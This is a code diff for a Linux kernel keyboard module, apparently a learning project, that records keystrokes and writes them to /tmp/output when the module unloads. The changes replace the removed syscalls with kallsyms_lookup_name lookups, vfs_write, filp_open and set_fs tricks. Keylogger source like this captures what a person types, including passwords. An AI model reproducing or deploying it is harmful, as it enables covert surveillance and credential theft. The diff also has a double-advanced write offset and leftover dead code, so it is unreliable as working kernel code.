@@ -13,35 +13,11 @@
 #define	MODULE_STATS_NAME	"stats_keylogger"
 #define FILENAME		"/tmp/output"
 #define BUF_SIZE		PAGE_SIZE
-/*
-static struct s_stroke {
-	unsigned char		key;
-	unsigned char		state;
-	char			*name;
-	char			value;
-	struct tm		time;
-	struct list_head	stroke_lst;
-};
 
-struct keyboard_map {
-  int   key;
-  int   ascii;
-  char  *str;
-  int   ascii_shift;
-  char  *shift_str;
-  bool  pressed;
-};
+typedef ssize_t (*ksys_write_type)(unsigned int fd, const char __user *buf, size_t count);
+typedef ssize_t (*vfs_write_type)(struct file *, const char __user *, size_t, loff_t *);
+typedef long (*ksys_open_type)(const char __user *filename, int flags, umode_t mode);
 
-*/
-
-struct s_keyboard_map_lst {
-  	int	key;
-  	int	ascii;
-  	char	*str;
-  	size_t	nb_pressed;
-  	size_t	nb_released;
-	struct list_head	map_lst;
-};
 DEFINE_SPINLOCK(mr_lock);
 
 enum {
@@ -313,12 +289,26 @@ static int __init keyboard_irq_init(void)
 	return 0;
 }
 
-static void write_file(int fd)
+
+static void write_file(struct file *filp)
 {
 	char			*output;
 	struct s_stroke		*strokes = NULL;
 	struct file		*file = NULL;
  	loff_t			pos = 0;
+	unsigned long long offset = 0;
+	mm_segment_t oldfs;
+	int ret;
+	
+
+//	ksys_write_type	ksys_write =
+//		(void *)kallsyms_lookup_name("ksys_write");
+
+	vfs_write_type	vfs_write =
+		(void *)kallsyms_lookup_name("vfs_write");
+	
+	oldfs = get_fs();
+	set_fs(get_ds());
 
 	output = kmalloc(BUF_SIZE, GFP_KERNEL);
 	memset(output, 0, PAGE_SIZE);
@@ -329,33 +319,57 @@ static void write_file(int fd)
 				output[strlen(output)] = strokes->value;
 			}
 			if (strokes->value == 13) {
-				sys_write(fd, output, strlen(output));
-				file = fget(fd);
-				if (file) {
-					vfs_write(file, output, strlen(output), &pos);
-					fput(file);
-				}
+				offset += vfs_write(filp, output, strlen(output), &offset);
+
+				//				ksys_write(fd, output, strlen(output));
+//				file = fget(fd);
+//				if (file) {
+//					vfs_write(file, output, strlen(output), &pos);
+//					fput(file);
+//				}
 				memset(output, 0, PAGE_SIZE);
 			}
 		}
 		kfree(strokes);
 	}
 //	pr_err("%s\n", output);
+	set_fs(oldfs);
+	filp_close(filp, NULL);
 	kfree(output);
-	sys_close(fd);
+//	ksys_close(fd);
+}
+
+struct file *file_open(const char *path, int flags, int rights) 
+{
+    struct file *filp = NULL;
+    mm_segment_t oldfs;
+    int err = 0;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+    filp = filp_open(path, flags, rights);
+    set_fs(oldfs);
+    if (IS_ERR(filp)) {
+        err = PTR_ERR(filp);
+        return NULL;
+    }
+    return filp;
 }
 
 static void __exit keyboard_irq_exit(void)
 {
 	int			fd;
+	struct file *		filp = NULL;
 	
-	mm_segment_t old_fs = get_fs();
-	set_fs(KERNEL_DS);
-	
-	fd = sys_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-  	if (fd >= 0)
-		write_file(fd);
- 	set_fs(old_fs);
+//	ksys_open_type	ksys_open =
+//		(void *)kallsyms_lookup_name("ksys_open");
+//	mm_segment_t old_fs = get_fs();
+//	set_fs(KERNEL_DS);
+//	fd = ksys_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	filp = file_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+  	if (filp)
+		write_file(filp);
+ //	set_fs(old_fs);
 	misc_deregister(&keylog_dev);
 	misc_deregister(&stats_dev);
 	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
